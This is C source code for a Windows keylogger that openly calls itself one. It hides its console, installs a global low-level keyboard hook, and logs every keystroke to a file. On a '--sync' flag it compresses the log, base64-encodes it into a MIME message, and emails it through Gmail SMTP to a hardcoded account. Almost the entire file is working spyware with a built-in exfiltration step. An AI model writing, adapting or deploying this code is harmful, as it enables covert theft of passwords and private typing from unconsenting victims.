/*
** ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
** ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
** ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
** :::::::::::::::::::::::::::::/+ossyyysso/:::::::::::::::::::::::::::::
** :::::::::::::::::::::::::+ydNMMMMMMMMMMMMMmhs/::::::::::::::::::::::::
** ::::::::::::::::::::::+yNMMMMMMMMMMMMMMMMMMMMMms/:::::::::::::::::::::
** ::::::::::::::::::::+dMMMMMMMMMMMMMMMMMMMMMMMMMMMh/:::::::::::::::::::
** ::::::::::::::::::/hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNs::::::::::::::::::
** :::::::::::::::::+mMMMMMMMMMMMMMNmhdhmMMMMMMMMMMMMMMh:::::::::::::::::
** ::::::::::::::::/NMMMMMMMMMMMMNy/:+m/:/hMMMMMMMMMMMMMh::::::::::::::::
** ::::::::::::::::dMMMMMMMMMMMMMyshhNMmhhodMMMMMMMMMMMMMs:::::::::::::::
** :::::::::::::::oMMMMMMMMMMMMMMo:/mMMMy/:hMMMMMMMMMMMMMN:::::::::::::::
** :::::::::::::::yMMMMMMMMMMMMMMm++ms+hd/sNMMMMMMMMMMMMMM+::::::::::::::
** :::::::::::::::dMMMMMMMMMMMMMMMMmyoooyNMMMMMMMMMMMMMMMMo::::::::::::::
** :::::::::::::::dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs::::::::::::::
** ::::::::::::::+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/:::::::::::::
** ::::::::::::/yNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms/:::::::::::
** :::::::::yhmNNNNNMMMNMMMMMNMMMMMNNNNNNNMMMMNNMMMMNNMMMNNNNmdhs::::::::
** ::::::::::::::::oMMh/NMNs/::omMMo:::::yMMh+::/yMMh:NMm::::::::::::::::
** ::::::::::::::::oMMhoMMy:::::oMMh:::::NMN/:::::mMM/NMm::::::::::::::::
** ::::::::::::::::+MMh/NMNs/::omMM+:::::yMMh+::/yMMh:NMm::::::::::::::::
** ::::::::::::::::/NMm:/hMMMNMMMd+:::::::sNMMNNMMNy:+MMd::::::::::::::::
** :::::::::::::::::hMMo::/osyso/:::::/:::::+syys+:::hMMo::::::::::::::::
** :::::::::::::::::/NMN/:::::::/ohmNNNNNdy+::::::::sMMd:::::::::::::::::
** ::::::::::::::::::+NMN+:::::yNMNMNo/yMMNMmo:::::sMMm/:::::::::::::::::
** :::::::::::::::::::+mMMh/:/mMN+:sMdymN/:sMMy::+mMMh:::::::::::::::::::
** :::::::::::::::::::::sNMMhdMMNmdNMMMMMNdNNMMydMMmo::::::::::::::::::::
** ::::::::::::::::::::::/smMMMy:/NMMMMMMMd::mMMMdo::::::::::::::::::::::
** :::::::::::::::::::::::::/dMMdmNMMMMMMMNmmMMy/::::::::::::::::::::::::
** ::::::::::::::::::::::::::/NMM+:sMNdNN/:sMMd::::::::::::::::::::::::::
** :::::::::::::::::::::::::::/dMNmNN+:sMNmNNy:::::::::::::::::::::::::::
** :::::::::::::::::::::::::::::+ymNMMNMMNds/::::::::::::::::::::::::::::
** :::::::::::::::::::::::::::::::::/+++/::::::::::::::::::::::::::::::::
** ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
** ::::::::::::::::::::::::N:O::C:O:P:Y:R:I:G:H:T::::::::::::::::::::::::
** ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
** This thing is no ordinary keylogger.. 
** This thing not only logs keys, it also may unhook its users from the
** space time continuum, giving them the uncontrollable ability to
** teleport, and then I can steal their computer.
** ( A quote from a comment I've read here:
** http://www.cplusplus.com/forum/lounge/27569/ :-P )
*/

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include "zlib.h"
#include "openssl/bio.h"
#include "openssl/evp.h"
#include "curl/curl.h"

/*
* Define here email and password; you'd better use an app password.
* https://support.google.com/accounts/answer/185833
* https://security.google.com/settings/security/apppasswords
*/
#define TO "myemail@gmail.com"
#define PASS "MyPasswordOrBetterMyAppPassword"

int prepareFile();
void prepareCA();
void prepareMail();
void sendMail();
LRESULT CALLBACK kbdlog( int nCode, WPARAM wParam, LPARAM lParam);
void saveKey(char _key);

int main(int argc, char *argv[]) {
	FreeConsole(); // Hide my a$$..
	/*
	** If we have arguments and first argument is --sync we'll email the file.
	** No error checks nowhere.. Lazy implementation..
	*/
	if (argc>1) {
		if (strcmp("--sync",argv[1]) == 0) {
			if (prepareFile()) {
				prepareCA();
				prepareMail();
				sendMail();
			}
		}
		return 0;
	}
	/*
	** Else we're in the logging mood.. :-)
	*/

	/*
	** Based on: http: //stackoverflow.com/questions/9149600#9149702
	** with some help from: http://youtu.be/sLeM686uLY0
	*/

	// Retrieve the applications instance
	HINSTANCE instance = GetModuleHandle(NULL);
	// Set a global Windows Hook to capture keystrokes using the function declared below
	HHOOK kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, kbdlog, instance,0);
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(kbdhook);
// --> Out of main here!
return 0;
}

LRESULT CALLBACK kbdlog( int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	if (wParam == WM_KEYUP) {
		saveKey((char)pKeyBoard->vkCode);
	}
   return CallNextHookEx( NULL, nCode, wParam, lParam);
}

void saveKey(char _key) {
	FILE *logfile;
	logfile = fopen("securelog.log", "a");
	/*
	** See: https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
	*/
	switch (_key) {
		case VK_SHIFT:
			fputs("[SHIFT]", logfile);
			break;
		case VK_CAPITAL:
			fputs("[CAPS]", logfile); // Capslock
			break;
		case VK_BACK:
			fputs("[BACK]", logfile);
			break;
		case VK_LBUTTON:
		case VK_RBUTTON:
			fputs("[MBTN]", logfile); // Mouse buttons.
			break;
		case VK_RETURN:
			fputs("[ENTER]", logfile);
			break;
		case VK_ESCAPE:
			fputs("[ESC]", logfile);
			break;
		case VK_PRIOR:
		case VK_NEXT:
			fputs("[PAGE]", logfile);  // Page up & down
			break;
		case VK_CONTROL:
			fputs("[CTRL]", logfile);
			break;
		case VK_MENU:
			fputs("[ALT]", logfile); // Alt key.
			break;
		case VK_END:
			fputs("[END]", logfile);
			break;
		case VK_HOME:
			fputs("[HOME]", logfile);
			break;
		case VK_LEFT:
			fputs("[LEFT]", logfile);
			break;
		case VK_UP:
			fputs("[UP]", logfile);
			break;
		case VK_RIGHT:
			fputs("[RIGHT]", logfile);
			break;
		case VK_DOWN:
			fputs("[DOWN]", logfile);
			break;
		case VK_INSERT:
			fputs("[INS]", logfile);
			break;
		case VK_DELETE:
			fputs("[DEL]", logfile);
			break;
		default:
			fputc(_key, logfile);
			break;
	}
	fclose(logfile);
}

int prepareFile() {
	/*
	** We will compress the log file securelog.log with zlib giving us the 
	** securelog.xxx compressed file that we will be sending by mail.
	** Based on zpipe.c provided with zlib; check the zlib/examples/ folder.
	** Turned down errors check for now..
	*/
	#define CHUNK 16384
	int flush;
	unsigned have;
	z_stream strm;
	unsigned char in[CHUNK], out[CHUNK];
	FILE *source, *dest;

	source = fopen("securelog.log","r");
	if (!source) return 0; // Stop the madness if there is no log file..
	dest = fopen("securelog.xxx","w");
	strm.zalloc = Z_NULL;
	strm.zfree = Z_NULL;
	strm.opaque = Z_NULL;
	(void)deflateInit(&strm, 9);
	do {
		strm.avail_in = fread(in, 1, CHUNK, source);
		flush = feof(source) ? Z_FINISH : Z_NO_FLUSH;
		strm.next_in = in;
		do {
			strm.avail_out = CHUNK;
			strm.next_out = out;
			(void)deflate(&strm, flush);
			have = CHUNK - strm.avail_out;
			fwrite(out, 1, have, dest);
		} while (strm.avail_out == 0);
	} while (flush != Z_FINISH);
	(void)deflateEnd(&strm);
	fclose(source);
	fclose(dest);
	return 1;
}

void prepareCA() {
	/*
	** We will download our bundle of X.509 certificates from curl's website.
	** Based on http://stackoverflow.com/questions/3471122#3471329
	** Turned down errors check for now..
	*/
	CURL* curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, "http://curl.haxx.se/ca/cacert.pem");
	FILE* file = fopen("cacert.pem", "w");
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);
	curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	fclose(file);
}

void prepareMail() {
	/*
	** This functions prepares the mail payload (headers, body and base64 encoded
	** attachment). The payload is saved as securelog.pld file that the function
	** sendMail() will be using later.
	*/
	char mailHeader[] = "To: " TO "\r\nSubject: Securelog\r\n"
						"Content-Type: multipart/mixed; boundary=AWESOME\r\n\r\n"
						"--AWESOME\r\n"
						"Content-Type: text/plain; charset=UTF-8\r\n\r\n"
						"See attachment.\r\n\r\n"
						"--AWESOME\r\n"
						"Content-Type: application/octet-stream;\r\n"
						"Content-Disposition: attachment; filename=securelog.xxx\r\n"
						"Content-Transfer-Encoding: base64\r\n\r\n";
	char mailFooter[] = "\r\n--AWESOME--";
	BIO *bio = NULL, *b64 = NULL;
	char *buffer = NULL;
	size_t bytesRead;
	FILE *file_in = NULL, *file_out = NULL;

	file_in = fopen("securelog.xxx", "rb");
	file_out = fopen("securelog.pld", "w");
	fwrite(mailHeader,sizeof(mailHeader)-1,1,file_out);
	fclose(file_out);
	file_out = 0;

	b64 = BIO_new(BIO_f_base64());
	bio = BIO_new_file("securelog.pld","a");
	BIO_push(b64, bio);
	buffer = malloc(sizeof(char)*512);
	while ((bytesRead = fread(buffer, 1, 512, file_in)) > 0) BIO_write(b64, buffer, bytesRead);
	free(buffer);
	BIO_flush(b64);
	BIO_free_all(b64);

	file_out = fopen("securelog.pld", "a");
	fwrite(mailFooter,sizeof(mailFooter)-1,1,file_out);
	fclose(file_out);
}

void sendMail() {
	/*
	* Initialisation
	*/
	CURL *curl;
	CURLcode res = CURLE_OK;
	struct curl_slist *recipients = NULL;
	curl = curl_easy_init();
	if(curl) {
		/*
		* Authentication with TO and PASS defined above.
		*/
		curl_easy_setopt(curl, CURLOPT_USERNAME, TO);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, PASS);
		/*
		* Gmail smtp
		* https://support.google.com/a/answer/176600
		*/
		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
		/*
		* CURLUSESSL_ALL: Require SSL for all communication or fail with CURLE_USE_SSL_FAILED
		*/
		curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
		/*
		* CA bundle from http://curl.haxx.se/ca/cacert.pem ; we'll be updating it because we don't
		* know if some certificates has expired in the meantime or not.
		*/
		curl_easy_setopt(curl, CURLOPT_CAINFO, "cacert.pem");
		recipients = curl_slist_append(recipients, TO);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		/*
		* We're using the CURLOPT_READDATA FILE pointer to read the crafted payload from it.
		*/
		FILE *mailTxt = fopen("securelog.pld", "r");
		curl_easy_setopt(curl, CURLOPT_READDATA, mailTxt);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		/*
		* Send the message
		*/
		res = curl_easy_perform(curl);
		/*
		* Free the list of recipients
		*/
		curl_slist_free_all(recipients);
		/* Always cleanup */
		curl_easy_cleanup(curl);
	}
}
